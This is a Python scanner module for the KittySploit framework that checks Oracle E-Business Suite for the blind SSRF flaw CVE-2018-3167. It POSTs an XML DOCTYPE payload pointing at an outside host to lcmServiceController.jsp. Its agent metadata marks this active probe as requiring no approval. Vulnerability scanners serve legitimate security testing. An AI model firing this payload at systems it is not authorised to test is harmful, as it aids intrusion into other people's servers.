#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle E-Business Suite, Application Management Pack component (User Monitoring subcomponent), is susceptible ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle E-Business Suite - Blind SSRF Detection',
        'description': 'Oracle E-Business Suite, Application Management Pack component (User Monitoring subcomponent), is susceptible to blind server-side request forgery. An attacker with network access via HTTP can gain read access to a subset of data, connect to internal services like HTTP-enabled databases, or perform post requests towards internal services which are not intended to be exposed. Affected supported versions are 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, and 12.2.7.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'oracle', 'ebs', 'ssrf', 'blind', 'e-business_suite', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html',
            'http://web.archive.org/web/20211206102649/https://securitytracker.com/id/1041897',
            'https://medium.com/@x41x41x41/unauthenticated-ssrf-in-oracle-ebs-765bd789a145',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-3167',
            'http://www.securitytracker.com/id/1041897',
        ],
        'cve': 'CVE-2018-3167',
    }

    def run(self):
        path = '/OA_HTML/lcmServiceController.jsp'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='<!DOCTYPE root PUBLIC "-//B/A/EN" "http://interact.sh">')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Unexpected text in DTD',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='medium',
                reason='Oracle E-Business Suite - Blind SSRF detected',
                path=path,
            )
            return True
        return False

